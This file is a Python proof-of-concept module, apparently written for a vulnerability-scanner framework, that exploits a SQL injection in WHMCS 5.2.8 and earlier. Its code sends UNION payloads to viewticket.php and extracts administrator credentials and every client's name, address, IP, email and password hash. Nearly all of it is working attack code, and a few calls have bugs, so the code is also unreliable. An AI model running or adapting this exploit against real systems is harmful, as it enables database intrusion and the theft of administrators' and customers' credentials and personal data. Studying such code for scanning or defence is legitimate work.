# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib, re, sys
from urllib2 import Request, urlopen

class Vuln(ABVuln):
    vuln_id = 'WHMCS_0001' # 平台漏洞编号，留空
    name = 'WHMCS <=5.2.8 SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2013-10-18'  # 漏洞公布时间
    desc = '''
        THIS TIME IT'S again the same mistake in
        /includes/dbfunctions.php

        WE Can manipulate the GET/POST variables and end up with something like $key = array('sqltype' => 'TABLEJOIN', 'value' = '[SQLI]');
        FROM THIS VULNERABILITY WE CAN EVEN change /configuration.php whatever we want (PHP code included).
    ''' # 漏洞描述
    ref = 'http://0day5.com/archives/801/' # 漏洞来源
    cnvd_id = 'Unkonwn' # cnvd漏洞编号
    cve_id = 'Unkonwn' #cve编号
    product = 'WHMCS'  # 漏洞应用名称
    product_version = 'WHMCS <=5.2.8'  # 漏洞应用版本


ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"

def exploit(sql, url):
        sqlUnion = '-1 union select 1,0,0,0,0,0,0,0,0,0,0,%s,0,0,0,0,0,0,0,0,0,0,0#' % sql
        print "Doing stuff: %s" % sqlUnion
        #you could exploit any file that does a select, I randomly chose viewticket.php
        #print (url)
        r = urlopen(Request('%sviewticket.php' % url, data="tid[sqltype]=TABLEJOIN&tid[value]=%s" % sqlUnion, headers={"User-agent": ua})).read()
        return re.search(r'<div class="clientmsg">(.*?)</div>', r, re.DOTALL).group(1).strip()


class Poc(ABPoc):
    poc_id = 'f63df388-5817-4879-9803-a2e8cde9c764'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-13' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #https://www.t00ls.net/articles-24597.html
            #get admins
            #print exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)')
            if exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)', self.target):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #get admins
            admins = exploit('(SELECT GROUP_CONCAT(id,0x3a,username,0x3a,email,0x3a,password SEPARATOR 0x2c20) FROM tbladmins)', self.target)

            #get users
            count = int(exploit('(SELECT COUNT(id) FROM tblclients)'))
            print "User count %d" % count
            for i in range(count):        
                users =  exploit('(SELECT CONCAT(id,0x3a,firstname,0x3a,lastname,0x3a,address1,0x3a,address2,0x3a,city,0x3a,country,0x3a,ip,0x3a,email,0x3a,password) FROM tblclients LIMIT %d,1)' % i, self.target)

            if admins and users:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到admins：{admins}，users:{users}'.format(
                    target=self.target, name=self.vuln.name, admins=admins, users=users))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()